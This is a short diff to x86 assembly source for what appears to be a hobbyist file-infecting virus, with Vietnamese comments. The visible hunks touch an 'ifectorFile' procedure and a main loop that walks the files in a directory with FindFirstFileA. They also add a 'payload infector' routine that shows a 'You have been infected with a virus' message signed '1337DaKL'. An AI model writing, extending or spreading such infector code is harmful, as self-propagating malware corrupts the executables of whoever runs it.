@@ -114,7 +114,8 @@ endProcInfectorFile:
 
 ifectorFile endp
 
-main: ; Ham main 	
+main: ; Ham main 
+		
     push offset wfd
     push offset path
     call FindFirstFileA ; Duyet file dau tien trong thu muc
@@ -159,12 +160,15 @@ nextLoopFile:
 endLoopFile: ; end chuong trinhf
     push 0 
     call ExitProcess 
-    
-payload :
+    ;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+payload : ; payload infector
+	
 	push 0
 	push 0
-	push 0
+	push offset notificationMalware
 	push 0
 	call MessageBox
-    
+	ret
+notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
+testok db 100 dup (1)
 end main
